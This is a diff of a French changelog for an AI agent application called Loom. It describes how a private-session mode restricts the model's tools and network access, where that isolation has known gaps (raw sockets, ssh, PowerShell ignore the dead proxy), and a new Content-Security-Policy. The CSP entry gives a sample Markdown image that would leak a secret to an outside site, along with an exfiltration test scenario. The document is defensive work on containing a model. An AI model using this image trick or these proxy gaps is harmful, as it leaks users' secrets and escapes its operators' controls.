@@ -27,16 +27,30 @@
   sessions) ; `recall` en lecture ; `write_note` pour la session.
 - **Outils** : `web_search`, `fetch_url`, `watch_video`, `add_marketplace`,
   `install_plugin` et tous les outils MCP retirés. `run_workflow` aussi : il exécute le
-  script du modèle dans le processus de Loom (`exec()`), hors de toute protection réseau. `run_shell`, `monitor` et
-  `serve_and_check` tournent avec un proxy mort et `UV_OFFLINE` (consigne respectée par
-  les outils courants, pas une isolation). `check_page` n'accepte que des URL
+  script du modèle dans le processus de Loom (`exec()`), hors de toute protection
+  réseau. `run_shell`, `monitor` et `serve_and_check` tournent avec un proxy mort et
+  `UV_OFFLINE` (consigne respectée par les outils courants, pas une isolation). `check_page` n'accepte que des URL
   strictement locales (antislash, identifiants et hôtes encodés refusés : `urlparse` et
   Chromium les lisent différemment) ; son Chromium a un proxy mort, WebRTC limité au
   proxy (sinon l'UDP vers un STUN public sort), la prélecture DNS coupée, et chaque
   requête est vérifiée sur l'URL normalisée par Chromium.
 - **Limites** (voir `docs/session-privee.md`) : cette protection est applicative. Le
   proxy mort n'est pas un pare-feu (sockets bruts, ssh, `Invoke-WebRequest` de
-  PowerShell 5.1 l'ignorent). L'isolation imposée par l'OS est l'étape suivante.
+  PowerShell 5.1 l'ignorent). L'isolation par l'OS n'est pas prévue tant que ce cas
+  reste théorique (KISS) ; son plan est dans `docs/architecture-session-privee.md`.
+
+## 2026-10-21 : les pages de Loom ne chargent plus rien hors de Loom (CSP)
+
+- Toutes les réponses portent une Content-Security-Policy : images, scripts, styles,
+  polices, médias, cadres et connexions limités à Loom (`'self'`, plus `data:` et
+  `blob:` pour les images et médias locaux). Un modèle qui écrit
+  `![](https://site/?q=<secret>)` ne fait plus émettre la requête par le navigateur ;
+  avant, le rendu Markdown (DOMPurify) laissait passer ces images. Inline et eval restent
+  permis (scripts de la page, htmx) : la règle vise les sorties, pas le durcissement du
+  JS. Les images du bac à sable gardent leur CSP sandbox, plus stricte.
+- Vérifié en navigateur réel (`python -m tests.e2e.smoke_ui`, scénario `E2E-EXFIL` du
+  stub) : chat en streaming sans erreur console, image externe refusée avant envoi ;
+  témoin avec CSP ouverte : la requête part bien vers le site.
 
 ## 2026-10-20 : les commandes du modèle n'héritent plus du venv de Loom
 
